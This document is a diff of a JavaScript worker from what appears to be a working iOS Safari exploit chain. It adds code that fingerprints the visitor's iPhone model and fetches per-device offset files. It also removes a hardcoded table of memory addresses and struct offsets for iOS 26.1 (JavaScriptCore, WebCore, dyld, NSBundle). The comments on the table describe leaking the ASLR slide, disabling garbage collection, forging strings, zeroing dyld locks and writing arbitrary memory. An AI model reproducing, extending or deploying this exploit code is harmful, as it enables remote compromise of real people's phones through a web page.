@@ -204,6 +204,39 @@ class Encoder {
     }
 };
 const canvas = new OffscreenCanvas(64, 64);
+
+// ── Offset loading: per-device JSON from offsets/ directory ──
+// MobileSafari's UA carries NO model token ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 ...)") and
+// WebGL/WebGPU renderers are masked, so the PAGE fingerprints the hardware (physical resolution +
+// refresh class) and passes __DEVICE_INFO = { forced, uaModel, candidates, signals }. Resolution
+// order: forced override (?device=iPhoneXX,Y) -> UA model token (some embedders) -> fingerprint
+// candidates. The first candidate whose offsets/<id>.json fetches OK wins -- ambiguous fingerprint
+// buckets (e.g. 15 Plus vs 16 Plus) resolve to whichever model actually has an offsets file.
+let offsets, structs;
+async function loadOffsets() {
+    const info = self.__DEVICE_INFO || {};
+    const ua = self.navigator?.userAgent || '';
+    const uaM = ua.match(/iPhone(\d+,\d+)/);
+    let candidates, via;
+    if (info.forced) { candidates = [info.forced]; via = 'override'; }
+    else if (uaM) { candidates = ['iPhone' + uaM[1]]; via = 'ua'; }
+    else { candidates = info.candidates || []; via = 'fingerprint'; }
+    const base = self.__SLOG_ORIGIN || '';
+    const tried = [];
+    for (const device of candidates) {
+        tried.push(device);
+        const resp = await fetch(base + '/offsets/' + device + '.json');
+        if (!resp.ok) continue;
+        slog('[offsets] device=' + device + ' via=' + via + (info.signals ? ' (' + info.signals + ')' : ''));
+        const data = await resp.json();
+        offsets = Object.fromEntries(Object.entries(data.syms).map(([k, v]) => [k, BigInt(v)]));
+        structs = Object.fromEntries(Object.entries(data.structs).map(([k, v]) => [k, BigInt(v)]));
+        p.offsets = offsets;
+        p.structs = structs;
+        return;
+    }
+    throw new Error('loadOffsets: no offsets/ file for any candidate [' + tried.join(', ') + '] ua=' + ua);
+}
 // --- atexit mutex state management (26.1 protocol, disasm-verified on 23B85 libsystem_c +
 // libsystem_pthread): pthread_mutex_t at 0x1ed3f0b60 (NORMAL flavor; bits 2-3 of +0xc == 0).
 // The 64-bit ulock word is at +0x20 (align8(x0+0x27) in the fast lock, fast unlock AND slow
@@ -991,188 +1024,6 @@ function bigintFromBytes(bytes) {
 //  Everything version-specific lives here so the chain stays portable:
 //  to retarget another iOS build, add a sibling key and fill both tables.
 // =====================================================================
-const VERSIONS = {
-    // iOS 26.1  /  build 23B85  /  iPhone17,3  (vphone target)
-    "23B85": {
-        syms: {
-            "__pthread_head": 0x1ed3f8020n,
-            "AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken": 0x1ed745410n,
-            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker": 0x1ed744f30n,
-            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest": 0x1ed744e68n,
-            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice": 0x1ed744f08n,
-            "AVFAudio__OBJC_CLASS__AVSpeechUtterance": 0x1ed744300n,
-            "AVFAudio__OBJC_CLASS__AVSpeechSynthesizer": 0x1ed744df0n, // wake pool (fresh +initialize class)
-            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderVoice": 0x1ed7450e8n, // wake pool
-            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit": 0x1ed745070n, // wake pool
-            "AVFAudio__OBJC_CLASS__AVVCMetricsManager": 0x1ed744918n, // wake target 3: -init -> dlopen(libAudioIssueDetector) (deferred-loader-pairs.md (c))
-            "AXCoreUtilities__DefaultLoader": 0x1ed5a8748n,
-            "CFNetwork__gConstantCFStringValueTable": 0x1ee5a9570n,
-            "CMPhoto__kCMPhotoTranscodeOption_Strips": 0x1e77a3028n,
-            // CMPhoto interpose replacees for check_dlopen2/stage6 (resolved for 23B85 via dsc symaddr 2026-07-11; cache validated against known offsets)
-            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt": 0x1a5a87078n,
-            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage": 0x1a5a87228n,
-            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage": 0x1a5a4a570n,
-            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1a5a4ab94n,
-            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata": 0x1a5a4b2a8n,
-            "CMPhoto__CMPhotoCompressionSessionAddExif": 0x1a5a4ace0n,
-            "CoreServices__OBJC_CLASS__LSApplicationRestrictionsManager": 0x1ed443e08n, // wake fallback: plain -init -> dlopen(ManagedConfiguration), no NSBundle (round2)
-            "CoreServices__LSARM_guard": 0x1ed445110n, // !=0 means LSARM already initialized (target spent)
-            "emptyString": 0x1ed794420n,
-            "Foundation__NSBundleTables_bundleTables_value": 0x1ed43f9d0n,  // +[__NSBundleTables bundleTables] singleton slot (disasm @0x180777f68; was 0x1ed43ee48 via stale extract_offset)
-            "free_slabs": 0x1ed4e4e30n,
-            "GameController__OBJC_CLASS__GCEventInteraction": 0x1edecf130n, // wake target 2: +initialize -> NSBundle(GameControllerUI).load, own lock (deferred-loader-pairs.md (b1)); prereq GameController.framework
-            "GPUProcess_singleton": 0x1eb01db60n,
-            "ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt": 0x1ed5697b0n,
-            "ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage": 0x1ed5697a8n,
-            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage": 0x1ed569738n,
-            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1ed569730n,
-            "ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata": 0x1ed5693b8n,
-            "ImageIO__gFunc_CMPhotoCompressionSessionAddExif": 0x1ed569728n,
-            "ImageIO__gImageIOLogProc": 0x1ee39b008n,
-            "libdyld__gAPIs": 0x1ed0b4010n,
-            "libsystem_c__atexit_mutex": 0x1ed3f0b60n,
-            "libsystem_c__cxa_atexit": 0x18e920ba0n,   // [park-gate needle] worker1's parked stack contains __cxa_atexit+0x28 (lldb thread #5 frame #4) -- scan-for-park instead of the broken 26.1 count-poll
-            "mach_task_self_ptr": 0x280a64078n,
-            "mainRunLoop": 0x1ed7ac020n,
-            "NSConcreteMapTable_countOff": 0x1ed42f2bcn, // ldrsw ivar-offset globals (layout from getKeys:values: disasm, bundleWithPath-and-round2.md)
-            "NSConcreteMapTable_keysOff": 0x1ed42f2c0n,
-            "NSConcreteMapTable_valuesOff": 0x1ed42f2c4n,
-            "PassKitCore__OBJC_CLASS__PKContact": 0x1ed6d0e90n, // (23B85 objc class-opt list; format validated vs AVSpeechSynthesisVoice=0x1ed744f08). NOTE: useless as a wake trigger -- loadObjcClass only rides the AVFAudio->TextToSpeech deferred loader, so planting a non-AVFAudio class loads NOTHING (proven by run 014753: 4 loads, zero atexit activity). Kept for stage6's PKContact patch.
-            "pthread_create": 0x1df150ee8n,
-            "runLoopHolder_tid": 0x1ed7bcd08n,
-            "Security__gSecurityd": 0x1ea91d500n,
-            "TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit": 0x1ed96f348n,
-            "UIKitCore__OBJC_CLASS__UIManagedDocument": 0x1ee3f9980n, // wake target 1: +initialize -> dlopen(CoreData) direct, NO NSBundle/lock (deferred-loader-pairs.md (b2)); UIKitCore always in WebContent, CoreData not at boot
-            "CoreML__OBJC_CLASS___MLSNFrameworkHandle": 0x1ee57da68n, // wake target 0: -init -> dlopen(SoundAnalysis) direct in init (deferred-loader-pairs.md (c)); WebNN-only family = almost surely NOT resident on any device
-            "CoreML__OBJC_CLASS___MLVNFrameworkHandle": 0x1ee57d9a0n, // wake target 0b: -init -> dlopen(Vision) (deferred-loader-pairs.md (c))
-            "CoreML__OBJC_CLASS___MLNLPFrameworkHandle": 0x1ee57f4a8n, // wake target 0c: -init -> dlopen(NaturalLanguage) (deferred-loader-pairs.md (c))
-            "WebCore__PAL_getPKContactClass": 0x1ed61cff8n,
-            "WebCore__softLinkDDDFACacheCreateFromFramework": 0x1ed624310n,
-            "WebCore__softLinkDDDFAScannerFirstResultInUnicharArray": 0x1ed6238b0n,
-            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType": 0x1ed6238a0n,
-            "WebCore__softLinkOTSVGOTSVGTableRelease": 0x1ee638020n,
-            "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts": 0x1eb03ec80n,
-            "libARI_cstring": 0x2958de820n,
-            "libGPUCompilerImplLazy_cstring": 0x24c060870n,
-            "libGPUCompilerImplLazy__invoker": 0x24cc2fb90n, // the invoker THUNK on 23B85 (pacibsp; ldp x8,x0,[x0]; blraaz x8; mov w0,#0; retab) -- NOT 0x24cf168b4 (mid-function garbage)
-            "libsystem_pthread_base": 0x1df14d000n,
-            "pthread_linkedit": 0x1ffd24000n,
-            "PerfPowerServicesReader_cstring": 0x25e025e60n,
-            "AVFAudio__cfstr_SystemLibraryTextToSpeech": 0x1f3850990n,
-            "dyld__RuntimeState_vtable": 0x1eee9ed38n, // 23B85: __ZTVN5dyld412RuntimeStateE (was stale 0x1eee9f700)
-            "JavaScriptCore__jitAllowList": 0x1ed7bea70n,
-            "JavaScriptCore__jitAllowList_once": 0x1ed7be888n,
-            "RemoteGraphicsContextGLWorkQueue": 0x1ed642298n,
-            "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f141dec8n, //offset finder got this incorrect but this is the manually verified correct addr 
-            "WebCore__initPKContact_once": 0x1ed625138n,
-            "WebCore__initPKContact_value": 0x1ed625140n,
-            "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
-            // 23B85 disasm-verified (TelephoneNumberDetector::find 0x1a1059f80 + init lambda 0x1a105d2f4):
-            // the scanner OBJECT global find() passes to the DDDFA slot, its std::call_once guard
-            // (-1 = ready), and the isSupported byte (1 = skip the zeroing path).
-            "WebCore__TND_scannerObject": 0x1eb083f78n,
-            "WebCore__TND_scannerOnce": 0x1eb083f80n,
-            "WebCore__TND_supportedFlag": 0x1eb083f10n,
-            "WebCore__HTMLDocument_vtable": 0x1f1367550n, // RUNTIME-verified (real-device contexts walk 2026-08-02): ScriptExecutionContext-in-HTMLDocument SECONDARY address point (__ZTVN7WebCore12HTMLDocumentE 0x1f13671e0 + 0x370). The map stores the SEC subobject pointer (Document+0xd0; vtable offset-to-top at sym+0x360 = -0xd0), so ctx+0 holds this value, NOT the primary address point.
-            "DesktopServicesPriv_bss": 0x1ecff4080n,
-            "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
-            "pthread_create_jsc": 0x1998f5688n,
-            "libsystem_kernel__thread_suspend": 0x22ca45238n,
-            "libdyld__dlopen": 0x1800e8350n,
-            "libdyld__dlsym": 0x1800e8444n,
-            "jsc_base": 0x197f59000n,
-            "dyld__dlopen_from_lambda_ret": 0x18013a89cn, // ret into APIs::dlopen_from after the load-lambda(0x1801533b4) call; 3 sites 0x18013a89c/0x18013a944/0x18013a980 - primary=first, confirm on-device which is on the parked stack (was stale 0x18011cfc8=aligned_alloc+184)
-            "dyld__signPointer": 0x1801464c0n, // 23B85 free fn signPointer(u64,void*,bool,u16,ptrauth_key) @ nm extracted/dyld; 18.6's ChainedFixupPointerOnDisk::Arm64e::signPointer is 0x18011e210 here but with a DIFFERENT signature than 18.6's -- slow_pacia's (self,ctx,ptr) convention matches NEITHER directly; adapt before slow_pacia/JOP use. NOT needed for the slow_dlopen/dlsym self-test.
-            "dyld__RuntimeState_emptySlot": 0x180162658n, // RuntimeState::emptySlot() = vtable[0] (read from __ZTVN5dyld412RuntimeStateE+0x10; was stale 0x18015eb6c=decDlRefCount+632)
-            "WebProcess_ensureGPUProcessConnection": 0x19e16f334n,
-            "WebProcess_gpuProcessConnectionClosed": 0x19e16f628n,
-            "Security__SecKeychainBackupSyncable_block_invoke": 0x1888d9b94n,
-            "Security__SecOTRSessionProcessPacketRemote_block_invoke": 0x1888ee884n,
-            "MediaAccessibility__MACaptionAppearanceGetDisplayType": 0x1b021f5c0n,
-            "MediaAccessibility__MACaptionAppearanceGetTextEdgeStyle": 0x1b0221960n, // the caption-BATTERY function (called by captionsStyleSheetOverride on 26.1; GetDisplayType is gated by Manual mode and never fires)
-            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle": 0x1ee638648n, // ipsw dyld softlinks: init-fn 0x1a1056008
-            "WebCore__initMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle_once": 0x1eb083d48n,
-            "JavaScriptCore__globalFuncParseFloat": 0x1991abde8n,
-            "HOMEUI_cstring": 0x1834dbfa1n,
-            "ImageIO__IIOLoadCMPhotoSymbols": 0x185e73768n,
-            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt_func": 0x1a5a87078n,
-            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage_func": 0x1a5a87228n,
-            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage_func": 0x1a5a4a570n,
-            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation_func": 0x1a5a4ab94n,
-            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata_func": 0x1a5a4b2a8n,
-            "CMPhoto__CMPhotoCompressionSessionAddExif_func": 0x1a5a4ace0n,
-        },
-        structs: {
-            // --- GC disable (disableGC) ---
-            GlobalObject_toVM_a: 0x10n,   // addrof(globalThis)+0x10 -> intermediate
-            GlobalObject_toVM_b: 0x38n,   // intermediate+0x38       -> JSC::VM*
-            VM_heap: 0xc0n,   // offsetof(JSC::VM, heap)
-            Heap_isSafeToCollect: 0x259n,  // offsetof(JSC::Heap, m_isSafeToCollect)
-            // --- ASLR slide leak (parseFloat native fn) ---
-            JSFunction_executable: 0x18n,   // JSFunction::m_executableOrRareData
-            NativeExecutable_function: 0x28n,   // NativeExecutable::m_function (noPAC)
-            // --- worker forward chain (ctx -> JS globalScope), from 23B85 WebCore disasm ---
-            WorkerGlobalScope_script: 0x160n,  // WorkerOrWorkletGlobalScope::m_script
-            ScriptController_wrapper: 0x20n,   // WorkerOrWorkletScriptController::m_globalScopeWrapper (Strong slot -> deref)
-            WorkerGlobalScope_thread: 0x170n,  // WorkerOrWorkletGlobalScope::m_thread = ThreadSafeWeakPtr.m_objectOfCorrectType (TaggedPtr, +0 of the weak ptr) -> WorkerOrWorkletThread* (mask tag w/ noPAC)
-            WorkerThread_wtfThread: 0x28n,     // WorkerOrWorkletThread::m_thread -> WTF::Thread (start() disasm: str x8,[this,#0x28]; == DarkSword)
-            // --- allScriptExecutionContextsMap walk (stage3) ---
-            ContextsMap_stride: 0x30n,   // sizeof(HashMap bucket)
-            ContextsMap_value: 0x20n,   // bucket -> ScriptExecutionContext*
-            // --- stage7 telephone-scan gate (Document::isTelephoneNumberParsingEnabled, 23B85 disasm 0x1a058cdac) ---
-            Document_settings: 0x2d0n,                 // Document.m_settings -> Settings*
-            Settings_telephoneParsing: 0x2d2n,         // Settings byte, bit 0x8 = telephoneNumberParsingEnabled (embedder pref, default FALSE)
-            Document_telephoneParsingAllowed: 0xe0cn,  // Document.m_isTelephoneNumberParsingAllowed byte, bit 0x1
-            Document_secSubobjectOffset: 0xd0n,        // contexts-map value = Document+0xd0 (the ScriptExecutionContext subobject); Document* = ctx - 0xd0
-            // --- stage4: AXCoreUtilities DefaultLoader dispatch chain (Part A, disarm callback) ---
-            //     [LIVE] validate via the defaultLoader/dispatchSource/dispatchBlock logs
-            DefaultLoader_dispatchSource: 0x18n,
-            DispatchSource_inner: 0x58n,
-            DispatchInner_block: 0x28n,
-            DispatchBlock_invoke: 0x20n,   // [write] block invoke fn-ptr <- paciza_nullfunc
-            // --- stage4: ImageBitmap -> image buffer (Parts B/C + loadObjcClass) ---
-            //     [LIVE] validate via wrappedBitmap/imageBuffer logs (IOSurface internals)
-            JSImageBitmap_wrapped: 0x18n,  // addrof(bitmap)+0x18 -> C++ ImageBitmap
-            ImageBitmap_buffer: 0x10n,     // ImageBitmap -> image buffer
-            ImageBuffer_objcClass: 0x20n,  // [write] planted ObjC Class*
-            // --- stage4: NSBundleTables / loadedFrameworks walk (CONFIRMED via class-dump 23B85) ---
-            NSBundleTables_loadedFrameworks: 0x20n,  // __NSBundleTables._loadedFrameworks (NSConcreteHashTable)
-            LoadedFrameworks_count: 0x30n,           // NSConcreteHashTable.capacity (iteration bound; slots are sparse)
-            LoadedFrameworks_buffer: 0x08n,          // NSConcreteHashTable.slice.items (void** backing)
-            // --- stage4: NSBundle ivars (CONFIRMED via class-dump, unchanged 23B85) ---
-            NSBundle_flags: 0x08n,        // [write 0x40008] _flags
-            NSBundle_cfBundle: 0x10n,     // _cfBundle
-            NSBundle_initialPath: 0x28n,  // _initialPath (compared vs cfstr ".../TextToSpeech")
-            NSBundle_lock: 0x40n,         // [stage5 write 0]  _lock (os_unfair_lock; cleared so the bundle re-resolves) -- ivar layout: _resolvedPath@0x30, _firstClassName@0x38, _lock@0x40
-            // --- stage4: CFBundle internals (CoreFoundation, opaque struct) ---
-            CFBundle_loadedFlag: 0x34n,   // [write8 0]  [LIVE via libARI load]
-            CFBundle_execPath: 0x68n,     // [write] exec path -> forged CFString
-            // --- stage4: forged CFString (CONFIRMED canonical __CFString layout) ---
-            CFString_dataPtr: 0x10n,      // [write] char* -> libARI path
-            CFString_length: 0x18n,       // [write] length (0x15)
-            // --- stage4: libsystem_c atexit mutex guard ---
-            Atexit_mutexState: 0x20n,     // [write 0x102]
-            // --- stage5: dyld4::RuntimeState internals (dyld in shared cache) ---
-            RuntimeState_lock: 0x70n,         // RuntimeState -> _locks (runtimeStateLock)   [verify]
-            RuntimeStateLock_word: 0x0n,      // zero the dlopen-lock GUARD at *(RuntimeLocks+0). Confirmed via 23B85 disasm: BOTH takeDlopenLockBeforeFork@0x18015335c AND releaseDlopenLockInForkParent@0x180156ee0 do `ldr x0,[this]; cbz x0,ret` on +0, and NEITHER writes +0 (persistent init-set pointer -> our zero holds). guard=0 => the main wake-load NEVER acquires the lock AND worker1's finalize+main both skip releaseDlopenLockInForkParent's os_unfair_lock_unlock(+0x20) -> no cross-thread unlock -> no 26.1 os_unfair_lock abort. Zeroing +0x20 (the lock word) instead leaves the guard set, so release runs os_unfair_lock_unlock on a value=0 lock -> EXC_BREAKPOINT abort (the crash 2026-07-14). MUST be 0x0, NOT 0x20.
-            RuntimeState_interposeBuf: 0xb8n, // RuntimeState._interposingTuplesAll buffer    [verify]
-            RuntimeState_interposeSize: 0xc0n,// RuntimeState._interposingTuplesAll size      [verify]
-            // --- stage5: WTF::Thread stack bounds (CONFIRMED: m_stack@0x10 = vtable@0+refcount@8; StackBounds{m_origin@0,m_bound@8}) ---
-            Thread_stackBottom: 0x10n,        // WTF::Thread.m_stack.m_origin (high addr)
-            Thread_stackTop: 0x18n,           // WTF::Thread.m_stack.m_bound  (low addr)
-            StackFrame_loader: 0x78n,         // dlopen frame -> parked dyld Loader* [verify]
-            // --- stage5: fake StringImpl for efficient_search (mirrors stage1 read primitive) ---
-            StringImpl_flags: 0x1000n,        // 8-bit buffer flag OR'd with (length<<32)
-            StringImpl_data: 0x08n,           // StringImpl m_data (char* buffer)
-        },
-    },
-};
-
-const TARGET_BUILD = "23B85";
-const offsets = VERSIONS[TARGET_BUILD].syms;
-const structs = VERSIONS[TARGET_BUILD].structs;
-p.offsets = offsets;
-p.structs = structs;
 
 function signed32(v) {
     v &= 0xffffffffn;
@@ -2614,6 +2465,7 @@ p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the 
     } catch (e) { postMessage('[stage7] bomb-defusal ERR ' + (e && (e.message || e))); }
 }
 self.onmessage = async function (e) {
+    if (!offsets) await loadOffsets();
     try {
         const data = e.data;
 
